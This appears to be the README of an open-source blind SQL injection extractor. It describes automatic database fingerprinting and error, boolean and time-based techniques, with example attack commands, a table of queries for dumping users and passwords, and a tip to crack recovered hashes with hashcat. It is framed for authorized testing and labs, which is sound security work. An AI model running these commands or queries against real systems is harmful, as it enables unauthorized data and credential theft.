# pg-time-blind

A small, dependency-light **blind SQL injection extractor** with **automatic DBMS
detection** and **three techniques**, chosen for you.

Point it at any injectable parameter and it works out *where* the injection breaks
out, *which database* is behind it, and the *fastest way* to pull data — then dumps
the value. No sqlmap; only `requests`.

> The name is historical (it began life as a PostgreSQL time-based tool). It now
> supports PostgreSQL, MySQL, MSSQL and Oracle, and error/boolean/time techniques.

---

## ⚠️ Legal / ethical use

For **authorized security testing and education only** — your own systems, lab machines
(OffSec PG, HackTheBox), or targets you have **explicit written permission** to test.
Unauthorized access is illegal in most jurisdictions. You alone are responsible for use.

---

## How it works — two phases

**Phase 1 — Detection**

1. **Context** — finds how the injection breaks out: string vs numeric, `AND` / `OR`, or stacked.
2. **DBMS** — fingerprints the backend automatically (PostgreSQL, MySQL, MSSQL, Oracle).
3. **Technique** — picks the fastest available:
   - **error-based** — forces a DB error that reflects the value; dumps it in **one request**.
   - **boolean-based** — auto-calibrates a TRUE/FALSE signal (status code → body length → digit-stripped token).
   - **time-based** — `pg_sleep` / `SLEEP` / `WAITFOR` oracle; last resort.

**Phase 2 — Extraction**

- **error-based**: whole value in one shot (chunked automatically when the DBMS truncates
  its error text, e.g. MySQL `extractvalue` ≈ 32 chars).
- **boolean / time**: per-character binary search (~7 requests/char). Boolean extraction
  can run in parallel with `--threads`.

---

## Safety

`OR`-based contexts can change application state (`' OR 1=1` may match every row / log you
in). They are **disabled by default**. Pass `--allow-or` to include them.

---

## Resume / memory

Progress **and** the detected DBMS/technique/context are checkpointed after every character.
If a run is interrupted, re-run the **same command** to resume. `--fresh` ignores a
checkpoint; `--state PATH` chooses the file. It is deleted automatically on success.

---

## Requirements

- Python 3.7+
- [`requests`](https://pypi.org/project/requests/)

```bash
pip install -r requirements.txt
```

---

## Quick start

```bash
git clone https://github.com/SirReddington/pg-time-blind.git
cd pg-time-blind
pip install -r requirements.txt
python3 pg_time_blind.py --help
```

---

## Usage

```
python3 pg_time_blind.py --query "<SQL scalar>" [target] [detection] [tuning]
```

### Target (choose one style)

| Flag | Meaning |
|------|---------|
| `-u, --url`    | Target URL (may contain the marker for GET injection) |
| `-d, --data`   | Request body (may contain the marker) |
| `-H, --header` | Extra header `'Name: value'`, repeatable (may contain the marker) |
| `-X, --method` | HTTP method (default: `POST` if `-d` given, else `GET`) |
| `--request`    | Raw HTTP request file containing the marker |
| `--proto`      | Scheme for `--request` files (default `http`) |

### Injection

| Flag | Meaning |
|------|---------|
| `--query`     | **(required)** SQL scalar to extract, e.g. `"SELECT password FROM users WHERE username='bob'"` |
| `--marker`    | Placeholder for the injection point (default `INJECT`) |
| `--no-encode` | Do **not** URL-encode the payload |

### Detection

| Flag | Meaning |
|------|---------|
| `--dbms`          | Pin the DBMS: `postgresql`, `mysql`, `mssql`, `oracle` (skips fingerprinting) |
| `--force-boolean` | Only use boolean-based |
| `--force-time`    | Only use time-based |
| `--no-error`      | Don't use error-based even if available |
| `--allow-or`      | Include risky `OR` contexts (may change app state) |
| `--true-match`    | String present **only** in a TRUE response (overrides calibration) |
| `--false-match`   | String present **only** in a FALSE response |
| `--len-margin`    | Min body-length gap to treat as a boolean signal (default `12`) |
| `--len-jitter`    | Allowed body-length wobble within one response type (default `4`) |

### Tuning

| Flag | Default | Meaning |
|------|---------|---------|
| `--sleep`       | `3.0` | Seconds for the time-based sleep |
| `--threshold`   | `sleep*0.6` | Response time counted as "slept" |
| `--retries`     | `1` | Re-confirm each time-based positive N times (beats jitter) |
| `--threads`     | `1` | Parallel workers for **boolean** extraction |
| `--maxlen`      | `64` | Max value length to probe |
| `--cmin/--cmax` | `32/126` | ASCII bounds for the binary search |
| `--proxy`       | – | e.g. `http://127.0.0.1:8080` to view in Burp |

### Resume

| Flag | Meaning |
|------|---------|
| `--state` | Checkpoint file path (default: auto-named `.pgtb-<id>.json`) |
| `--fresh` | Ignore any existing checkpoint and start over |

---

## DBMS support matrix

| DBMS | Fingerprint | Error-based | Boolean | Time-based |
|------|-------------|-------------|---------|------------|
| PostgreSQL | `pg_catalog` | `CAST(... AS int)` | ✅ | `pg_sleep` (inline + stacked) |
| MySQL | `CONNECTION_ID()` | `extractvalue` (chunked) | ✅ | `SLEEP` (inline) |
| MSSQL | `@@version` | `CAST/convert` | ✅ | `WAITFOR DELAY` (stacked) |
| Oracle | `v$version` | – | ✅ | – |

Oracle uses boolean extraction (its inline time/error primitives are intentionally left
out for reliability). Pin any backend with `--dbms` to skip fingerprinting.

---

## Examples

**1. Fully automatic — detect context, DBMS and technique, then extract**

```bash
python3 pg_time_blind.py \
  -u http://10.10.10.10:3000/login \
  -d "username=INJECT&password=test" \
  --query "SELECT password FROM users WHERE username='admin'"
```

**2. Reuse a saved Burp request** (put `INJECT` where the payload goes)

```bash
python3 pg_time_blind.py --request req.txt --query "SELECT current_user"
```

**3. Pin MySQL, allow risky OR contexts**

```bash
python3 pg_time_blind.py --request req.txt --dbms mysql --allow-or \
  --query "SELECT current_user()"
```

**4. Speed up boolean extraction with 8 workers**

```bash
python3 pg_time_blind.py -u "http://target/item?id=INJECT" --threads 8 \
  --query "SELECT version()"
```

**5. Force time-based and help the calibrator on a noisy page**

```bash
python3 pg_time_blind.py -u http://t/login -d "username=INJECT&password=x" \
  --force-time --true-match "Dashboard" \
  --query "SELECT current_user"
```

---

## Sample output

```
=== PHASE 1: detection ===
[*] boolean probe : string-and ...
[+] boolean signal on string-and: status==302
[+] DBMS fingerprint: postgresql
[+] error reflection on string-and (postgresql)

[+] DBMS      : postgresql
[+] TECHNIQUE : error-based
[+] CONTEXT   : string-and
[*] detection cost: 11 requests

=== PHASE 2: extraction ===
[*] query : SELECT password FROM users WHERE username='admin'

[+] RESULT: s3cr3tP@ss!
[*] total requests: 12  (error-based, postgresql)
```

When nothing reflects and boolean has no signal, it falls back to time:

```
[+] DBMS      : postgresql
[+] TECHNIQUE : time-based
[+] CONTEXT   : stacked
```

---

## Useful queries to feed `--query`

| Goal | PostgreSQL / MySQL | MSSQL | Oracle |
|------|--------------------|-------|--------|
| Current user | `SELECT current_user` | `SELECT SYSTEM_USER` | `SELECT user FROM dual` |
| Version | `SELECT version()` | `SELECT @@version` | `SELECT banner FROM v$version WHERE rownum=1` |
| Current DB | `SELECT current_database()` / `SELECT database()` | `SELECT DB_NAME()` | `SELECT ora_database_name FROM dual` |
| List users | `SELECT string_agg(usename,',') FROM pg_user` | `SELECT name FROM sys.sql_logins` | `SELECT username FROM all_users` |
| Dump a password | `SELECT password FROM users WHERE username='admin'` | same | same |

---

## Tips

- **Let detection choose** — error-based is fastest, boolean next, time last. Override only when needed.
- If calibration mis-fires on a dynamic page (CSRF tokens, timestamps), use `--true-match`/`--false-match` or raise `--len-margin`.
- If the result is a **hash**, extract it then crack offline (`hashcat -m <mode> hash.txt rockyou.txt`).
- Raise `--sleep` on slow/jittery networks for time-based; keep `--threads` modest to avoid overwhelming the target.
- Interrupted? Re-run the **same** command to resume.
- Found nothing? Try `--allow-or`, `--dbms`, `--force-time`, or check marker placement — not necessarily that the target is safe.

---

## Contributing

Issues and PRs welcome — especially Oracle error/time primitives and additional contexts.

## License

[MIT](LICENSE)
